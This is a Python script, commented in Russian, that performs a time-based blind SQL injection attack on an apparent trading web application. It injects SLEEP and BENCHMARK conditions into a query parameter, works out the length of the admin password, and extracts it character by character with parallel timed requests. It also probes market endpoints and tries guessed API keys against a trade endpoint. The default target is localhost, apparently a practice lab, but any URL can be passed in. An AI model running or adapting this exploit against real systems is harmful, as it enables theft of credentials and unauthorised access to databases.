import requests
import time
import json
import statistics
import concurrent.futures
import sys
from typing import List, Dict, Optional
import hashlib

class HFTSQLiAttack:
    """Усовершенствованная timing-based атака для HFT систем"""
    
    def __init__(self, base_url="http://127.0.0.1:8888"):
        self.base_url = base_url
        self.check_url = f"{base_url}/check"
        self.market_url = f"{base_url}/market"
        self.trade_url = f"{base_url}/trade"
        
        # Параметры для HFT атак
        self.sleep_threshold = 0.002  # 2 мс порог для HFT
        self.request_count = 0
        self.start_time = time.time()
        self.timeout = 1  # 1 секунда timeout для HFT
        
        # Статистические данные
        self.response_times = []
        self.failed_requests = 0
        
        # Параметры для параллельных запросов
        self.max_workers = 10
        self.batch_size = 100
        
        # Набор символов для HFT паролей
        self.charset = "0123456789"
        self.charset += "abcdefghijklmnopqrstuvwxyz"
        self.charset += "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        self.charset += "!@#$%^&*()_+-=[]{}|;:,.<>?/~`"
    
    def send_request(self, condition: str) -> Optional[float]:
        """Отправка запроса с измерением времени"""
        self.request_count += 1
        
        try:
            start = time.perf_counter()
            response = requests.get(
                self.check_url,
                params={'condition': condition},
                timeout=self.timeout,
                headers={
                    'User-Agent': 'HFT-Trader/1.0',
                    'Connection': 'close'
                }
            )
            elapsed = time.perf_counter() - start
            
            if response.status_code == 200:
                self.response_times.append(elapsed)
                return elapsed
            else:
                self.failed_requests += 1
                return None
                
        except Exception as e:
            self.failed_requests += 1
            return None
    
    def test_condition_statistical(self, condition: str, samples: int = 10) -> bool:
        """Статистическая проверка условия для HFT"""
        times = []
        
        for _ in range(samples):
            elapsed = self.send_request(condition)
            if elapsed is not None:
                times.append(elapsed)
        
        if len(times) < samples / 2:
            return False
        
        # Статистический анализ
        avg_time = statistics.mean(times)
        std_dev = statistics.stdev(times) if len(times) > 1 else 0
        
        # Проверка на аномалии (timing атака)
        return avg_time > self.sleep_threshold
    
    def send_parallel_requests(self, conditions: List[str]) -> Dict[str, float]:
        """Параллельная отправка запросов для HFT"""
        results = {}
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            future_to_cond = {
                executor.submit(self.send_request, cond): cond 
                for cond in conditions
            }
            
            for future in concurrent.futures.as_completed(future_to_cond):
                cond = future_to_cond[future]
                try:
                    elapsed = future.result()
                    if elapsed is not None:
                        results[cond] = elapsed
                except Exception:
                    pass
        
        return results
    
    def discover_length_hft(self) -> Optional[int]:
        """Определение длины пароля с использованием статистики для HFT"""
        print("🔍 Определение длины пароля (HFT метод)...")
        
        query = "(SELECT password FROM traders WHERE username='admin')"
        
        # Параллельная проверка длин
        conditions = []
        for length in range(1, 33):
            condition = f"LENGTH({query}) = {length}"
            conditions.append(condition)
        
        # Разбиваем на батчи
        batches = [conditions[i:i + self.batch_size] 
                  for i in range(0, len(conditions), self.batch_size)]
        
        for batch in batches:
            results = self.send_parallel_requests(batch)
            
            for cond, elapsed in results.items():
                if elapsed >= self.sleep_threshold:
                    # Извлекаем длину из условия
                    length = int(cond.split('=')[-1].strip())
                    print(f"✅ Найдена длина пароля: {length} символов")
                    return length
        
        print("❌ Не удалось определить длину")
        return None
    
    def extract_char_optimized(self, position: int) -> Optional[str]:
        """Оптимизированное извлечение символа для HFT"""
        query = "(SELECT password FROM traders WHERE username='admin')"
        
        print(f"  Позиция {position:2d}: ", end='', flush=True)
        
        # Используем бинарный поиск по ASCII
        low, high = 32, 126
        found_char = None
        
        while low <= high:
            mid = (low + high) // 2
            
            # Проверяем "ASCII код >= mid"
            condition_ge = f"ASCII(SUBSTR({query}, {position}, 1)) >= {mid}"
            
            if self.test_condition_statistical(condition_ge, samples=5):
                # Проверяем конкретный код
                condition_eq = f"ASCII(SUBSTR({query}, {position}, 1)) = {mid}"
                
                if self.test_condition_statistical(condition_eq, samples=3):
                    found_char = chr(mid)
                    break
                low = mid + 1
            else:
                high = mid - 1
        
        if found_char:
            print(f"'{found_char}' (ASCII {ord(found_char)}) ✓")
            return found_char
        
        print("✗ не найден")
        return None
    
    def attack_market_conditions(self):
        """Атака на рыночные условия в HFT системе"""
        print("\n💸 Атака на рыночные условия HFT...")
        
        # Пытаемся извлечь информацию через timing в рыночных условиях
        conditions = [
            "1=1 AND SLEEP(0.001)",
            "BENCHMARK(100000, MD5('test'))",
            "trader_id = 1 AND SLEEP(0.002)",
            "symbol LIKE '%' AND SLEEP(0.001)"
        ]
        
        for condition in conditions:
            try:
                start = time.perf_counter()
                response = requests.get(
                    self.market_url,
                    params={'condition': condition},
                    timeout=2
                )
                elapsed = time.perf_counter() - start
                
                print(f"  {condition[:40]:<40} → {elapsed*1000:6.2f} ms")
                
                if elapsed > self.sleep_threshold:
                    print(f"    ⚠️  Timing уязвимость обнаружена!")
                    
            except Exception as e:
                print(f"  Ошибка: {e}")
    
    def attack_trade_execution(self):
        """Атака на выполнение сделок через timing"""
        print("\n💳 Атака на выполнение сделок...")
        
        # Пробуем timing атаку на API ключи
        api_chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ-"
        
        for i in range(10):
            test_key = 'API-KEY-' + ''.join([api_chars[j % len(api_chars)] for j in range(i, i+8)])
            
            try:
                start = time.perf_counter()
                response = requests.get(
                    self.trade_url,
                    params={
                        'api_key': test_key,
                        'symbol': 'AAPL',
                        'quantity': '100'
                    },
                    timeout=2
                )
                elapsed = time.perf_counter() - start
                
                if response.status_code == 200:
                    data = response.json()
                    print(f"  Ключ {test_key[:15]:<15} → {elapsed*1000:6.2f} ms | {data}")
                    
                    if elapsed > 0.0015:  # Порог для timing атаки
                        print(f"    ⚠️  Возможная timing уязвимость!")
                        
            except Exception as e:
                pass
    
    def run_hft_attack(self):
        """Запуск полной HFT атаки"""
        print("="*80)
        print("💀 HFT TIMING-BASED SQL INJECTION АТАКА")
        print("="*80)
        print("⚡ Специально для высокочастотной торговли")
        print("="*80)
        
        # Проверка сервера
        try:
            info = requests.get(f"{self.base_url}/info", timeout=2)
            if info.status_code == 200:
                server_info = info.json()
                print(f"🎯 Цель: {server_info.get('server', 'Unknown')}")
                
                if 'password' in server_info:
                    print(f"🔓 Реальный пароль: '{server_info['password']}'")
                    self.real_password = server_info['password']
                else:
                    self.real_password = None
            else:
                print("❌ Сервер не отвечает")
                return
                
        except Exception as e:
            print(f"❌ Ошибка подключения: {e}")
            return
        
        # Тестирование уязвимостей
        print("\n🎯 Тестирование HFT уязвимостей...")
        
        test_conditions = [
            "1=1 AND SLEEP(0.001)",
            "1=0 AND SLEEP(0.001)",
            "username='admin' AND SLEEP(0.002)",
            "BENCHMARK(50000, MD5('test'))"
        ]
        
        vulnerable = False
        for condition in test_conditions:
            elapsed = self.send_request(condition)
            if elapsed and elapsed > self.sleep_threshold:
                print(f"  ✅ Уязвимость: {condition[:40]:<40} → {elapsed*1000:6.2f} ms")
                vulnerable = True
            elif elapsed:
                print(f"  ✗ Нет уязвимости: {condition[:40]:<40} → {elapsed*1000:6.2f} ms")
        
        if not vulnerable:
            print("  ❌ Timing уязвимости не обнаружены")
            return
        
        # Определение длины пароля
        length = self.discover_length_hft()
        if not length:
            print("⚠️  Использую стандартную длину: 16 символов")
            length = 16
        
        # Извлечение пароля
        print(f"\n🔓 Извлечение пароля ({length} символов)...")
        password_chars = []
        
        for pos in range(1, length + 1):
            char = self.extract_char_optimized(pos)
            if char:
                password_chars.append(char)
                current = ''.join(password_chars)
                print(f"    Прогресс: '{current}'")
            else:
                password_chars.append('?')
        
        password = ''.join(password_chars)
        
        # Дополнительные атаки для HFT
        self.attack_market_conditions()
        self.attack_trade_execution()
        
        # Проверка результата
        print(f"\n🔐 Проверка извлеченного пароля...")
        if self.real_password:
            if password == self.real_password:
                print(f"✅ ПАРОЛЬ СОВПАДАЕТ: '{password}'")
            else:
                print(f"⚠️  Извлеченный: '{password}'")
                print(f"⚠️  Настоящий: '{self.real_password}'")
        else:
            print(f"⚠️  Извлеченный пароль: '{password}'")
        
        # Отчет
        total_time = time.time() - self.start_time
        print("\n" + "="*80)
        print("📊 ОТЧЕТ ОБ HFT АТАКЕ")
        print("="*80)
        print(f"🎯 Цель: {self.base_url}")
        print(f"🔓 Результат: {password}")
        print(f"📊 Всего запросов: {self.request_count}")
        print(f"❌ Неудачных запросов: {self.failed_requests}")
        print(f"⏱️  Общее время: {total_time:.2f} секунд")
        
        if self.response_times:
            avg_time = statistics.mean(self.response_times) * 1000
            min_time = min(self.response_times) * 1000
            max_time = max(self.response_times) * 1000
            print(f"📈 Среднее время ответа: {avg_time:.2f} мс")
            print(f"📉 Минимальное время: {min_time:.2f} мс")
            print(f"📈 Максимальное время: {max_time:.2f} мс")
        
        print(f"⚡ Скорость: {self.request_count/total_time:.1f} запр/сек")
        print("="*80)
        
        if password and '?' not in password:
            print("\n✅ HFT АТАКА УСПЕШНА!")
        else:
            print("\n⚠️  Атака завершена частично")
        
        return password

def main():
    """Основная функция для запуска HFT атаки"""
    import sys
    
    if len(sys.argv) > 1:
        base_url = sys.argv[1]
    else:
        base_url = "http://127.0.0.1:8888"
    
    print(f"🎯 HFT атака на: {base_url}")
    print("⚡ Используются микросекундные timing атаки")
    
    attack = HFTSQLiAttack(base_url)
    attack.run_hft_attack()

if __name__ == "__main__":
    main()